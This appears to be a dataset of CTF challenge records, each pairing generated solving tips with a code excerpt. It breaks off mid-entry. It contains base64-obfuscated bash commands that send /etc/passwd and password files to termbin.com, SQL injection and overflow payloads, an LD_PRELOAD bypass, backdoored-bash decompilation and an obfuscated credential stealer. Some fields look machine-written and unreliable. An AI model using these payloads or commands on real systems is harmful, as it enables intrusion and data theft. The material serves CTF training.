            "In tasks involving the analysis of bash history for forensics challenges, it is useful to filter out known benign commands to reduce noise and highlight potentially malicious activities using tools like `grep` with `-Ev` options for inverse matching. This approach allows for a more focused investigation on uncommon or suspicious commands which could suggest a compromise or malicious activity on the system.\n   - Example command to filter out noise: `grep -Ev '^(command1|command2)' file`",
            "Encoded commands in bash history files, especially those utilizing `base64` encoding, can be indicative of an attempt to obfuscate malicious commands. It's crucial to decode these commands to investigate their nature and intent. Additionally, if direct decoding results in errors or produces binary data, it suggests that multiple encodings may have been used, or additional manipulation like string concatenation might be necessary to reveal the payload.\n   - Example command to safely decode base64 without executing: `python -c 'from base64 import b64decode as decode; print(decode(\"BASE64_STRING\"))'`"
        ],
        "key": "```bash\necho cHMgYXggPiBwcm9jZXNzZXM= | base64 -d | bash\necho Y2F0IHByb2Nlc3NlcyB8IG5jIHRlcm1iaW4uY29tIDk5OTk= | base64 -d | bash\necho cm0gcHJvY2Vzc2Vz | base64 -d | bash\necho bHMgLWwgfCBuYyB0ZXJtYmluLmNvbSA5OTk5 | base64 -d | bash\necho Y2F0IC9ldGMvcGFzc3dkIHwgbmMgdGVybWJpbi5jb20gOTk5OQ== | base64 -d | bash\necho Y2F0IHBhc3N3b3Jkcy50eHQgfCBuYyB0ZXJtYmluLmNvbSA5OTk5 | base64 -d | bash\n```"
    },
    {
        "name": "BashD00r",
        "write_up": "dataset/raw/BashD00r.md",
        "type": "crypto",
        "competition": [
            "Aero/2021",
            "https://ctftime.org/event/1224/tasks/"
        ],
        "score": 500,
        "max_score": 500,
        "difficulty": 1.0,
        "knowledge": [
            "When dealing with backdoored binaries, especially in CTF challenges, one approach to uncover hidden functionalities or triggers is meticulously comparing the binary's behavior or structure with its original source code if available. Noticing discrepancies in function calls, added or modified code segments, and unexpected functionalities not present in the standard version can lead to the discovery of the backdoor mechanism or trigger. Additionally, static and dynamic analysis tools like IDA, GDB, and custom scripting can be essential in reverse engineering these modifications to identify how to interact with the backdoor.",
            "For challenges involving cryptographic procedures embedded within the binary, understanding and reversing custom or known cryptographic implementations is crucial. If a Feistel cipher, Serpent encryption, or any cryptosystem is utilized within a challenge, recognizing the encryption process and its parameters allows for the decryption of potentially obfuscated or encrypted data crucial for progressing in the challenge. Replicating the encryption algorithm in a high-level language like Python can facilitate the decryption or further manipulation of data, aiding in extracting hidden information, keys, or flags embedded within the challenge. This approach involves careful analysis of the cryptographic function's operations, constants, and any related transformations applied to the input data."
        ],
        "key": "```c\nv26 = __readfsqword(0x28u);  \nv0 = (_QWORD *)sh_malloc(4096LL, \"shell.c\", 587LL);  \nv0[511] = 0LL;  \nmemset(  \n  (void *)((unsigned __int64)(v0 + 1) & 0xFFFFFFFFFFFFFFF8LL),  \n  0,  \n  8LL * (((unsigned int)v0 - (((_DWORD)v0 + 8) & 0xFFFFFFF8) + 4096) >> 3));  \n*v0 = 0xDBEF3510A9ECE437LL;  \nv0[1] = 0xB557D3ED25ADEB3FLL;  \n*((_BYTE *)v0 + 16) = 40;  \ndecrypt_string(v0, 17);  \nv1 = fopen_0(v0, \"r\");  \nif ( !v1 )  \n  exit_0(0LL);  \nv2 = v1;  \nv3 = sh_malloc(1024LL, \"shell.c\", 645LL);  \nv4 = 8;\n```\n\n```c\nmysterious_array[0] = 0xE9B554BCBF7A0351LL;  \nmysterious_array[1] = 0x200A845B757AFF88LL;  \nmysterious_array[2] = 0x392848A34339A3EELL;  \nmysterious_array[3] = 0x21F8E1C664355C7CLL;  \nv9 = strlen((const char *)buffd) + 1;  \nbufread = (char *)buffd;  \ncount = 0LL;  \nwhile ( 1 )  \n{  \n  v17 = count;  \n  if ( strlen(bufread) <= count )  \n      break;  \n  seed1 = *(_DWORD *)&bufread[count];  \n  seed2 = *(unsigned int *)&bufread[count + 4];  \n  watconst2[0] = 1361583988;  \n  watconst2[1] = -1740780829;  \n  watconst2[2] = -1681248625;  \n  watconst2[3] = -1992688973;  \n  j_1 = 0;  \n  while ( 1 )  \n  {  \n      v14 = seed1 + watconst2[j_1 & 3] + seed2 + j_1 + (((unsigned int)seed2 >> 8) ^ ((_DWORD)seed2 << 6));  \n      ++j_1;  \n      seed1 = seed2;  \n      if ( j_1 == 48 )  \n      break;  \n      seed2 = v14;  \n  }  \n  count += 8LL;  \n  if ( mysterious_array[v17 / 8] != (seed2 << 32) + v14 )  \n  {  \n      print_free(watconst, \"shell.c\", 563LL);  \n      goto LABEL_10;  \n  }  \n}\n```\n\n```c\n__int64 __fastcall do_the_hustle(char *serial)  \n{  \n __m128i *key; // rbp  \n _QWORD *v2; // r12  \n _QWORD *v3; // r13\n\n serial[31] = 0;  \n key = (__m128i *)calloc_0(4096LL, 1LL);  \n *key = _mm_load_si128(xmmword_5060);  \n key->m128i_i8[0] ^= 0x18u;  \n key->m128i_i8[1] ^= 0x94u;  \n key->m128i_i8[2] ^= 0x9Eu;  \n key->m128i_i8[3] ^= 0xC6u;  \n key->m128i_i8[4] ^= 0x73u;  \n key->m128i_i8[5] ^= 0x1Au;  \n key->m128i_i8[6] ^= 0x9Cu;  \n key->m128i_i8[7] ^= 0xBEu;  \n key->m128i_i8[8] ^= 0x53u;  \n key->m128i_i8[9] ^= 0x8Du;  \n key->m128i_i8[10] ^= 0x82u;  \n key->m128i_i8[11] ^= 0x56u;  \n key->m128i_i8[12] ^= 0x99u;  \n key->m128i_i8[13] ^= 0xB2u;  \n key->m128i_i8[14] ^= 0x23u;  \n key->m128i_i8[15] ^= 0xC0u;  \n v2 = (_QWORD *)malloc_0();  \n v3 = (_QWORD *)malloc_0();  \n serpent_encrypt(serial, (__int64)key, (__int64)v2, 0x10u);  \n if ( *v2 ^ 0x9601AAF388AB0192LL | v2[1] ^ 0x2127591BB4E06735LL )  \n   return send_backdoor_status(0);  \n serpent_encrypt((_DWORD *)serial + 4, (__int64)key, (__int64)v3, 0x10u);  \n if ( *v3 ^ 0x582C4E2FDC6C7226LL | v3[1] ^ 0xC00B8862110C7A9DLL )  \n   return send_backdoor_status(0);  \n send_backdoor_status(1);  \n free_0(v2);  \n return free_0(v3);  \n}\n```\n\n```c\nv3 = backdoor_enabled;  \nif ( backdoor_enabled )  \n{  \n  if ( ~(strlen((const char *)a1) + 1) == ~0x29uLL && !(unsigned int)memcmp_0(a1, \"1+2+3+4+5\", 9LL) )  \n  {  \n    ((void (__fastcall *)(__int64))(v3 + 91))(a1 + 9);  \n    v6 = sh_malloc(4096LL, \"evalstring.c\", 194LL);  \n    *(_QWORD *)(v6 + 4088) = 0LL;  \n    mkfifo_0(v6, 438LL);  \n    v9 = open_0(v6, 0LL);  \n    buf[0] = 0LL;  \n    buf[1] = 0LL;  \n    read_0(v9, buf, 1);  \n    close_0(v9);  \n    print_free(v6, \"evalstring.c\", 511LL);  \n    if ( LOBYTE(buf[0]) == 1 )  \n    {  \n      xmmword_14F320 = (__int128)_mm_loadu_si128((const __m128i *)(a1 + 9));  \n      qword_14F330 = *(_QWORD *)(a1 + 25);  \n      dword_14F338 = *(_DWORD *)(a1 + 33);  \n      word_14F33C = *(_WORD *)(a1 + 37);  \n      byte_14F33E = *(_BYTE *)(a1 + 39);  \n      backdoor_activation((const char *)(a1 + 9));  \n    }  \n  }  \n}\n```\n\n```c\nvoid __fastcall backdoor_activation(const char *key)  \n{  \n __int64 v1; // rbp  \n const char *v2; // rax  \n const __m128i *v3; // rbx\n\n v1 = mmap_0(0LL, 98323, 7, 34, 0, 0);  \n cryptoshit_again((__int64)key, (__int64)&unk_12B000, v1, 98323LL, strlen(key));  \n v2 = (const char *)getenv(\"JAKWEULOD\");  \n if ( v2 )  \n {  \n   v3 = (const __m128i *)v2;  \n   if ( ~(strlen(v2) + 1) == ~65LL && ((unsigned int (__fastcall *)(const char *))(v1 + 143))(v2) == 1 )  \n   {  \n     kk1 = (__int128)_mm_loadu_si128(v3);  \n     xmmword_14F430 = (__int128)_mm_loadu_si128(v3 + 1);  \n     xmmword_14F440 = (__int128)_mm_loadu_si128(v3 + 2);  \n     unk_14F450 = _mm_loadu_si128(v3 + 3);  \n     sub_89675();  \n     fork_and_spawn();  \n   }  \n }  \n munmap_0(v1, 98323LL);  \n}\n```\n\n```c\nvoid fork_and_spawn()  \n{  \n __m128i *key; // rbx  \n __int64 v1; // rax  \n _BYTE v2[1648]; // [rsp-1CF8h] [rbp-DD10h] BYREF  \n __int64 v3; // [rsp-1688h] [rbp-D6A0h] BYREF  \n _QWORD v4[5841]; // [rsp-688h] [rbp-C6A0h] BYREF\n\n while ( &v3 != &v4[-6144] )  \n   ;  \n v4[5631] = __readfsqword(0x28u);  \n memcpy_0(v2, &unk_ECB08, 50784);  \n key = (__m128i *)sh_malloc(64LL, \"evalstring.c\", 401LL);  \n key->m128i_i64[0] = 0LL;  \n key->m128i_i64[1] = 0LL;  \n key[1].m128i_i64[0] = 0LL;  \n key[1].m128i_i64[1] = 0LL;  \n key[2].m128i_i64[0] = 0LL;  \n key[2].m128i_i64[1] = 0LL;  \n key[3].m128i_i64[0] = 0LL;  \n key[3].m128i_i64[1] = 0LL;  \n *key = _mm_load_si128((const __m128i *)&xmmword_14F220);  \n key[1] = _mm_load_si128((const __m128i *)&xmmword_14F230);  \n key[2] = _mm_load_si128((const __m128i *)&xmmword_14F240);  \n key[3] = _mm_load_si128((const __m128i *)&xmmword_14F250);  \n v1 = sh_malloc(50784LL, \"evalstring.c\", 404LL);  \n cryptoshit_again((__int64)key, (__int64)v2, v1, 50784LL, 64LL);  \n while ( 1 ) // jmp $0 rocks :\u00fe  \n   ;  \n}\n```"
    },
    {
        "name": "Basic Rev",
        "write_up": "dataset/raw/Basic Rev.md",
        "type": "reverse",
        "competition": [
            "BYUCTF/2022",
            "https://ctftime.org/event/1660/tasks/"
        ],
        "score": 50,
        "max_score": 500,
        "difficulty": 0.1,
        "knowledge": [
            "For challenges requiring understanding or manipulation of binary programs, particularly when dealing with conditional branches (such as identifying correct inputs that lead to desired outcomes), symbolic execution frameworks like angr can be extremely effective. This approach facilitates the discovery of inputs that lead to specific states within the application, bypassing the need for manual reverse engineering of binary code to some extent. In the context of CTF challenges where the goal is to find a specific input or a series of inputs that lead to a successful condition (like printing a flag), leveraging such tools can save significant time and effort. Example usage includes defining symbolic variables for input, specifying start and goal states, and instructing the framework to explore paths between these states, avoiding undesired outcomes.",
            "In binary reversing or exploitation challenges, identifying \"good\" and \"bad\" paths based on program behavior (e.g., output messages like \"Wrong number!\" or \"Finished processing flag!\") can help in setting up conditions for symbolic execution tools like angr. This involves specifying addresses that represent failure or success states and configuring the symbolic execution engine to seek state transitions from the start state to the desired end state, thereby filtering out paths that lead to failure states. By defining these paths explicitly, the solver can more efficiently navigate through the binary's execution flow to find values (e.g., correct inputs) that satisfy the conditions leading to the success state, such as revealing a hidden flag."
        ],
        "key": "```assembly\n000023e9  81bddcfeffff2101\u2026cmp     dword [rbp-0x124 {var_12c}], 0x121\n```"
    },
    {
        "name": "beef-of-finitude",
        "write_up": "dataset/raw/beef-of-finitude.md",
        "type": "pwn",
        "competition": [
            "BlueHens/2021",
            "https://ctftime.org/event/1298/tasks/"
        ],
        "score": 100,
        "max_score": 500,
        "difficulty": 0.2,
        "knowledge": [
            "When exploiting buffer overflow vulnerabilities to overwrite a local variable and control the instruction pointer (IP), careful calculation of the offset is essential. For variables, identify their location relative to the buffer start, and for IP redirection, find the offset to the saved return address. This can be facilitated by examining the vulnerable function's stack setup, considering both buffer sizes and local variable allocations. In this context, two separate buffers (`first_buffer` and `second_buffer`) and a target variable (`var_to_change`) were identified. The first step involved overflowing `second_buffer` to overwrite `var_to_change` with a specific value (`0xdeadbeef`), then adjusting the IP to execute a desired function (`win`).",
            "In scenarios where specific parameter values must be set to bypass additional checks within a function redirected via overflow, a carefully crafted payload that includes not only the IP redirection but also the necessary parameters aligned as they would be on the stack for a function call is required. This involves appending the address of the function (`win`) to be executed, followed by the parameters it checks against (`param_1`, `param_2`, `param_3`, `param_4`), ensuring they are in the correct order and format to satisfy the conditional checks in the function. Example payload:\n\n```python\npad_1 = b\"A\" * OFFSET_TO_VAR  # OFFSET_TO_VAR is the distance from the buffer start to the variable to overwrite\npad_2 = b\"A\" * OFFSET_TO_IP  # OFFSET_TO_IP is the distance from the variable to the saved return address on stack\n\nstack_frame =  p32(0x08049236)  # Address of win function\nstack_frame += p32(0xSOME_EXIT_FUNC)  # Address of an exit function or similar to prevent crash after win executes\nstack_frame += p32(0x14b4da55)  # param_1 expected by win\nstack_frame += p32(0)  # param_2 expected by win\nstack_frame += p32(0x67616c66)  # param_3 expected by win\nstack_frame += p32(0)  # param_4 expected by win\n\npayload = pad_1 + p32(0xdeadbeef) + pad_2 + stack_frame\n```"
        ],
        "key": "```c\nvoid myFun(void)  \n{  \n       char second_buffer[10];  \n       char first_buffer[16];  \n       int var_to_change = 7;\n\n       puts(\"Enter your Name: \");  \n       fgets(first_buffer, 16, stdin);  \n       puts(\"Enter your password: \");  \n       fgets(second_buffer, 336, stdin);  \n       if (var_to_change == -0x21524111)  // 0xdeadbeef  \n       {  \n               flag = 1;  \n               puts(\"Wow you overflowed the right value! Now try to find the flag !\\n\");  \n       }  \n       else   \n       {  \n               puts(\"Try again!\\n\");  \n       }  \n       return;  \n}  \n```"
    },
    {
        "name": "Befuddled1",
        "write_up": "dataset/raw/Befuddled1.md",
        "type": "misc",
        "competition": [
            "WolvCTF/2024",
            "https://ctftime.org/event/2240/tasks/"
        ],
        "score": -1,
        "max_score": -1,
        "difficulty": -1,
        "knowledge": [
            "When faced with a programming challenge involving an esoteric language like Befunge, understanding the basic syntax and instructions of that language is crucial for manipulating the stack or control flow to achieve the desired outcome. Example payload for popping the stack and creating a loop in Befunge: `>,<`",
            "In challenges with character limits for code submission, exploring compact programming patterns or loops that fulfill the challenge requirements within the given constraints is essential. This involves using minimalistic code that leverages the language's features to interact with the data, in this case, the stack, efficiently."
        ],
        "key": "```python\ndef interpret_befunge(code):\n    stack = []\n    pc = [0, 0]  # Program counter\n    direction = [0, 1]  # Start moving right\n    while True:\n        command = code[pc[0]][pc[1]]\n        if command == '>':\n            direction = [0, 1]\n        elif command == '<':\n            direction = [0, -1]\n        elif command == ',':\n            if stack:\n                stack.pop()\n        # Move the program counter\n        pc[0] += direction[0]\n        pc[1] += direction[1]\n        # Wrap around if necessary\n        pc[0] %= len(code)\n        pc[1] %= len(code[0])\n```\n"
    },
    {
        "name": "Befuddled2",
        "write_up": "dataset/raw/Befuddled2.md",
        "type": "misc",
        "competition": [
            "WolvCTF/2024",
            "https://ctftime.org/event/2240/tasks/"
        ],
        "score": -1,
        "max_score": -1,
        "difficulty": -1,
        "knowledge": [
            "In Befunge programming challenges where the code execution direction is restricted, leveraging the \"_`\" (conditional horizontal movement based on stack value) and \"`.`\" (output top stack value as integer) instructions can effectively iterate through and reveal hidden or encoded information, such as ASCII values of a flag, within the given character limit constraints. Specifically, pushing numerical values onto the stack and using conditional logic to alter execution flow can circumvent limitations on direct program counter manipulation to iteratively reveal the flag.",
            "Understanding the behavior and utility of esoteric programming languages like Befunge is crucial for solving CTF challenges that involve code obfuscation or unconventional programming paradigms. Familiarity with the language's execution model (e.g., multi-dimensional instruction flow) and command set enables the crafting of concise programs that operate within restricted environments to extract or manipulate data, such as revealing hidden flags."
        ],
        "key": "```python\n# challenge.py\nimport sys\n\ndef interpret_befunge(code):\n    stack = []\n    x, y = 0, 0\n    direction = (1, 0)  # Start moving right\n    while True:\n        command = code[y][x]\n        if command.isdigit():\n            stack.append(int(command))\n        elif command == '_':\n            value = stack.pop()\n            if value == 0:\n                direction = (1, 0)  # Move right\n            else:\n                direction = (-1, 0)  # Move left\n        elif command == '.':\n            value = stack.pop()\n            sys.stdout.write(str(value))\n        # Move to the next position\n        x += direction[0]\n        y += direction[1]\n        if x < 0 or x >= len(code[0]) or y < 0 or y >= len(code):\n            break\n\n# Example usage\ncode = [\n    \"0_0..1_\"\n]\ninterpret_befunge(code)\n```"
    },
    {
        "name": "Beginner Rev",
        "write_up": "dataset/raw/Beginner Rev.md",
        "type": "The type of this challenge is **reverse**.",
        "competition": [
            "SwampCTF/2024",
            "https://ctftime.org/event/2138/tasks/"
        ],
        "score": -1,
        "max_score": -1,
        "difficulty": -1,
        "knowledge": [
            "In challenges related to reverse engineering where a static array of bytes is provided, and the program checks the input against a transformed version of this array, the transformation may involve a simple XOR operation. The key for the XOR operation can be identified through analyzing the program logic. In such cases, replicating the XOR logic in a scripting language like Python allows for the decryption of the hidden message.\n\n    Example Python code to perform XOR decryption:\n    ```python\n    def xor_string(input_string, key):\n        return ''.join(chr(ord(char) ^ key) for char in input_string)\n\n    characters = [ /* Array of characters from CTF challenge */ ]\n    xor_result = xor_string(''.join(characters), 0x41)  # 0x41 being the XOR key obtained from the challenge analysis.\n    print(\"XOR Result:\", xor_result)\n    ```",
            "In reverse engineering challenges that involve input validation through a series of character checks, the correct sequence to unlock or retrieve the hidden message (flag) can be retrieved by understanding the binary or program logic. This often involves reviewing conditional statements or loops that compare input characters against processed or obfuscated values within the binary.\n\n   This knowledge implies that the flag or key to solving the challenge can be directly derived by reversing the obfuscation logic applied to an array or string in the program. In scenarios where each character of the user\u2019s input is XORed with a constant value and then compared to values within the program, the solution involves reversing the XOR process with the same constant value used in the program."
        ],
        "key": "```c\nint __fastcall main(int argc, const char **argv, const char **envp)  \n{  \n __int64 i; // rax  \n char v5[56]; // [rsp+0h] [rbp-38h] BYREF\n\n printf(\"Please enter the flag:\");  \n __isoc99_scanf(\"%33s\", v5);  \n if ( strlen(v5) != 32 )  \n {  \nLABEL_6:  \n   puts(\"The flag entered is incorrect!\");  \n   exit(0);  \n }  \n for ( i = 0LL; i != 32; ++i )  \n {  \n   if ( v5[i] != ((unsigned __int8)byte_402010[i] ^ 0x41) )  \n     goto LABEL_6;  \n }  \n puts(\"Congratulations! You found the flag!\");  \n return 0;  \n}\n```"
    },
    {
        "name": "Beginner's Crypto",
        "write_up": "dataset/raw/Beginner's Crypto.md",
        "type": "crypto",
        "competition": [
            "TSG/2021",
            "https://ctftime.org/event/1431/tasks/"
        ],
        "score": -1.0,
        "max_score": 500,
        "difficulty": -1,
        "knowledge": [
            "When faced with an encryption challenge involving modulo operations with large exponents, Euler's theorem can be a powerful tool for finding modular inverses, especially when direct inversion is not possible due to lack of coprime numbers. This approach can specifically be utilized in scenarios where the modulus is a power of a prime number, as demonstrated with $\\bmod5^{175}$. The theorem stipulates that $a^{\\varphi(n)} \\equiv 1 \\pmod{n}$ for $a$ and $n$ coprime, leading to the calculation of $(2^{10000})^{-1} \\bmod5^{175}$ by exponentiation to $\\varphi(5^{175}) - 1$. This method aids in decrypting or reversing modular exponentiation operations by finding the necessary modular inverse.",
            "For challenges that require manipulation of numbers in a specific modular space, simulating division by 2 (or any other factor inversely related to the multiplication operation in question) under modulus can be achieved through iterative conditional logic. This is particularly applicable when dealing directly with the modular form of a given calculation might lead to odd or even outcomes that affect the next operation in a predictable way. This is depicted through the logic of checking for evenness, then adjusting the modulus accordingly if odd, effectively 'dividing' the number by 2 within that modular space. This technique is useful for iteratively reversing a modular exponentiation where the direct inversion approach is not feasible or when dealing with conditions that significantly alter the approach, such as when the outcome needs to maintain congruence within a specific modulus.\n\nExample Payload:\n\n```python\ndef divide_by_two(x, mod): \n    if x % 2 == 0: \n        return x // 2 \n    else: \n        return (x + mod) // 2\n```"
        ],
        "key": "```python\nassert(len(open('flag.txt', 'rb').read()) <= 50)  \nassert(str(int.from_bytes(open('flag.txt', 'rb').read(), byteorder='big') <<\n10000).endswith('1002773875431658367671665822006771085816631054109509173556585546508965236428620487083647585179992085437922318783218149808537210712780660412301729655917441546549321914516504576'))  \n```"
    },
    {
        "name": "Beginner's Luck",
        "write_up": "dataset/raw/Beginner's Luck.md",
        "type": "web",
        "competition": [
            "Securinets/2019/Quals",
            "https://ctftime.org/event/769/tasks/"
        ],
        "score": 989,
        "max_score": 1000,
        "difficulty": 0.989,
        "knowledge": [
            "When encountering SQL injection vulnerabilities, especially in scenarios where the application's behavior changes based on the success or failure of the query (indicative of blind SQL injection), payloads can be crafted to extract data. This is possible by altering the query logic to return true when a guess is correct. A common technique involves using the `LIKE` operator with wildcards to guess the data one character at a time. \n\nExample payload for verifying a guess of a token's character: \n```\nval=' OR (ip='x.x.x.x' AND token LIKE 'A%') #\n```",
            "In scenarios where an application limits the number of attempts you can make (e.g., guessing a token or password) before either locking out the user or resetting the token, changing the client's IP address can be a strategy to bypass this limitation. This approach hinges on the server tracking attempts or sessions based on IP addresses, thereby enabling an attacker to continue guessing or brute-forcing data beyond the set attempt limit.\n\nNo specific payload example for changing IP addresses, as it involves changing the client's network configuration or using proxies/VPNs."
        ],
        "key": "```php\n$sql = \"SELECT * FROM users WHERE ip='\" . $_SERVER['REMOTE_ADDR'] . \"' AND token='\" . $_POST['val'] . \"'\";\n$result = $conn->query($sql);\n```"
    },
    {
        "name": "Beginner's Misc",
        "write_up": "dataset/raw/Beginner's Misc.md",
        "type": "misc",
        "competition": [
            "TSG/2020",
            "https://ctftime.org/event/1004/tasks/"
        ],
        "score": 157,
        "max_score": 428,
        "difficulty": 0.36682242990654207,
        "knowledge": [
            "When faced with a challenge that includes arbitrary code execution (ACE) with restrictions, creative use of the programming language's features and external encodings can be effective. If direct execution of certain commands or direct manipulation of values is restricted by filtering or the challenge's constraints, encoding payloads in a format that bypasses these restrictions, such as base64, allows for unexpected expressions of operations or data manipulation. This method hinges on finding a bridge between the encoded format and the desired operation or outcome, in this case, calculating a specific numeric value such as pi using encoded strings that represent mathematical operations when decoded.\n   - Example Scenario: Given the restriction to produce a specific mathematical result without directly invoking mathematical operations or constants, explore how encoded strings could be decoded at runtime to produce these operations or constants indirectly.\n   - Example Payload: `0.1/e00+` decoded as `\"{M>\" -> e00+`, where the decoding result represents an operation that contributes to calculating pi.",
            "In challenges involving numeric calculations or expressions, leveraging the programming language's ability to handle very large or small numbers, namely floating-point arithmetic, can be useful. By decomposing a target number (like pi) into a series of smaller operations (addition, division, etc.) that when combined equal the target, one can craft payloads that fulfill the challenge's conditions without directly using the target number or restricted operations. The utilization of a lookup table to map encoded strings to specific operations significantly eases this task, enabling a systematic approach to constructing the payload.\n   - Example Scenario: When direct usage of specific numbers or mathematical constants is not possible due to challenge constraints, decompose the target number into a sequence of smaller, allowable operations that cumulatively achieve the original goal.\n   - Example Payload: Building pi (`3.141592653589793`) from operations like `\"0.1/e00+\"*31 + \"0.1/e01+\"*4 + \"0.1/e04+\"*159` where each operation represents a piece of the final value, mapped via a lookup table to encoded strings which are not directly filtered or restricted."
        ],
        "key": "```python\nfrom base64 import b64encode  \nimport math\n\nexploit = input('? ')\n\nif eval(b64encode(exploit.encode('UTF-8'))) == math.pi:  \n print(\"flag\")\n```"
    },
    {
        "name": "Beginner's Quest - Filter Env",
        "write_up": "dataset/raw/Beginner's Quest - Filter Env.md",
        "type": "The type of the CTF challenge described in the write-up is a ***pwn*** challenge.",
        "competition": [
            "GoogleCTF/2018/Quals",
            "https://ctftime.org/event/623/tasks/"
        ],
        "score": -1,
        "max_score": 500,
        "difficulty": -1,
        "knowledge": [
            "In challenges involving environment variables sanitization, if the sanitization process checks and set environment variables one by one, an opportunity for exploitation exists by duplicating an environment variable. Particularly, this can be exploited by invoking a variable known to be unsafe (such as `LD_PRELOAD`) twice, with the expectation that the system utilizes the last declared variable. This can lead to arbitrary code execution if a custom shared object is loaded via the bypassed environment variable.\n   - Sample payload: Set `LD_PRELOAD` twice in the environment variables, where the second occurrence points to a malicious shared object.",
            "For creating a shared object on systems where the target binary utilizes functionalities from dynamically linked libraries, compile the code with `-fPIC` (Position Independent Code) flag to generate a shared library. This is essential for successful injection and execution of custom code through mechanisms like `LD_PRELOAD`.\n   - Command example: `gcc obj.c -o obj -shared -fPIC`"
        ],
        "key": "```c\nfor (p = unsafe; *p != NULL; p++) {  \n   if (getenv(*p) != NULL) {  \n     if (setenv(*p, \"\", 1) != 0)  \n\terr(1, \"setenv\");  \n   }  \n }  \n```"
    },
    {
        "name": "Beginner's Quest - Fridge todo List",
        "write_up": "dataset/raw/Beginner's Quest - Fridge todo List.md",
        "type": "pwn",
        "competition": [
            "GoogleCTF/2018/Quals",
            "https://ctftime.org/event/623/tasks/"
        ],
        "score": -1,
        "max_score": 500,
        "difficulty": -1,
        "knowledge": [
            "In challenges involving binary exploitation with out-of-bounds write or read vulnerabilities, if an application does not check for negative indices, an attacker can manipulate memory locations preceding the intended array or buffer. This can be leveraged to read or write arbitrary memory locations by supplying a negative index, allowing for potential control over function pointers or other critical data structures. An example scenario is when an application's functionality, such as adding or removing items to a list, does not properly validate user-supplied indices, and the data structures are stored in contiguous memory regions with important data or pointers like the Global Offset Table (GOT).",
            "In situations where the binary has functions whose addresses can be leaked (like a write function in the GOT) and Position Independent Executable (PIE) is enabled, making the location of the binary in memory unknown, an attacker can calculate the base address of the libc or other sections of the binary by leaking the address of a known function. This information can then be used to perform further exploitation, such as overwriting function pointers or GOT entries to redirect execution flow. This technique is particularly useful when direct code execution is not possible or when the attacker aims to execute system calls or other functions not originally accessible. A common target for such overwrites in CTF challenges is replacing the address of frequently called functions like 'atoi' with the address of 'system' to execute arbitrary commands.\n   \n   Example Payload:\n   ```\n   idx = -(offset_to_target_function / sizeof(todo_entry))\n   new_address = address_of_system - calc_offset_to_system_from_leaked_address\n   write_payload(idx, new_address)\n   ```"
        ],
        "key": "```c\nint idx = read_int();  \nif (idx > TODO_COUNT) {  \n\tputs(OUT_OF_BOUNDS_MESSAGE);  \n\treturn;  \n}  \n```"
    },
    {
        "name": "Beginner's Quest - Media-DB",
        "write_up": "dataset/raw/Beginner's Quest - Media-DB.md",
        "type": "This write-up describes a SQL injection vulnerability in a music application, where the player can manipulate the query to extract sensitive information. Based on the provided information, the type of this challenge is **web**.",
        "competition": [
            "GoogleCTF/2018/Quals",
            "https://ctftime.org/event/623/tasks/"
        ],
        "score": -1,
        "max_score": 500,
        "difficulty": -1,
        "knowledge": [
            "When dealing with input filtering mechanisms that remove or escape certain hazardous characters like quotes or apostrophes, one can use alternative syntax or techniques that bypass these filters. Specifically, in environments where backslash escaping is not supported, like SQLite 3, consider utilizing SQL features such as UNION SELECT to inject malicious SQL queries without the need for escaping.  \nExample payload: 'and 1=2 union select 1,oauth_token from oauth_tokens;--",
            "In applications where user input is inserted into a database and then used in a SELECT query, if the application concatenates strings directly into queries without proper sanitization, it is possible to inject SQL through user inputs even when traditional characters are filtered. Using an unfiltered input to manipulate query behavior, such as injecting a UNION SELECT statement by setting an artist's name to a SQL injection payload, can be a way to exploit this vulnerability.  \nExample payload: 'and 1=2 union select 1,oauth_token from oauth_tokens;--"
        ],
        "key": "```python\ndef add_song(artist_name, song_name):\n    # Vulnerable to SQL Injection\n    query = f\"INSERT INTO artists (name) VALUES ('{artist_name}')\"\n    execute_query(query)\n    query = f\"INSERT INTO songs (name, artist_id) VALUES ('{song_name}', (SELECT id FROM artists WHERE name='{artist_name}'))\"\n    execute_query(query)\n\ndef shuffle_artist():\n    # Vulnerable to SQL Injection\n    query = \"SELECT name FROM artists ORDER BY RANDOM() LIMIT 1\"\n    artist_name = execute_query(query)\n    query = f\"SELECT name FROM songs WHERE artist_id=(SELECT id FROM artists WHERE name='{artist_name}')\"\n    songs = execute_query(query)\n    return songs\n```"
    },
    {
        "name": "Behir",
        "write_up": "dataset/raw/Behir.md",
        "type": "reverse",
        "competition": [
            "WPICTF/2021",
            "https://ctftime.org/event/1208/tasks/"
        ],
        "score": 300,
        "max_score": 500,
        "difficulty": 0.6,
        "knowledge": [
            "In malware analysis challenges, deeply nested and obscure function calls might contain crucial information for challenge resolution. These functions can manipulate and obfuscate strings, hiding valuable data such as flags. Breaking down each function and understanding its transformation on data step by step can reveal hidden information. Example: Identifying that `makesoul()` and `soulMore()` functions are used to construct an obfuscated string which eventually leads to the flag.",
            "An anti-debugging technique employed by malware is to check the execution time to detect step-by-step debugging or analysis. If the script detects that a certain block of code has taken longer to execute than expected, it might alter its behavior or terminate to avoid analysis. This can be circumvented by ensuring that the analysis or emulation environment runs the code without significant delays, or by modifying the malware's time check logic to remove or neutralize the anti-debugging feature."
        ],
        "key": "```python\nimport os  \nimport socket  \nimport hashlib  \nimport time\n\ndef main():  \n   ranger = int(time.time())  \n   if(str(hashlib.md5(open(__file__, \"rb\").read()[43:]).hexdigest()) == \"fa86075165f2630ff80397bf98323716\"):  \n       ether = -1  \n       crawlingclaw = \"who\" + \"ima\"[::ether]  \n       ether = ether + 1  \n       owlbear = os.popen(crawlingclaw).read().split('\\n')[ether]  \n       lightning = [\".chrom\"]  \n       lightning[ether] = lightning[ether] + \"iu\" + lightning[ether][ether -1] + '/'  \n       pi = \"PI.3.14159265\"  \n       yeti = \"pass\"  \n       ether = ether + 1  \n       ancestral = makesoul(yeti)   \n       arcane = \"_info.log\"  \n       ancestral[ether] = chr(123) + 'n' + makesoul(yeti)[ether].split('n')[ether]  \n       gold = \"stolen\" + arcane  \n       ancestral[ether] = 'w' + pi.split('.')[ether - ether] + ancestral[ether]  \n       gold = gold.replace('_', '-')  \n       for torrent in ancestral:  \n           lightning.append(torrent)  \n       ether = ether - ether  \n       lightning.append(\".kee\" + yeti + '2' + '/')  \n       for fire in range(len(lightning)):  \n           lightning[fire] = lightning[fire].replace('_', '-')  \n           lightning[fire] = lightning[fire].replace('w', 'W')  \n       bludgeoning = int(time.time())  \n       if(bludgeoning - ranger <= 2):  \n           evocation = len(lightning)  \n           for castle in range(evocation):  \n               devour(lightning[castle], owlbear, gold)  \n           for aboleth in range(evocation):  \n               lightning.pop(ether)  \n           circle(\"WPI\")\n\ndef devour(poison, gods, tome):  \n   ether = -1  \n   if(poison[ether] == '/'):  \n       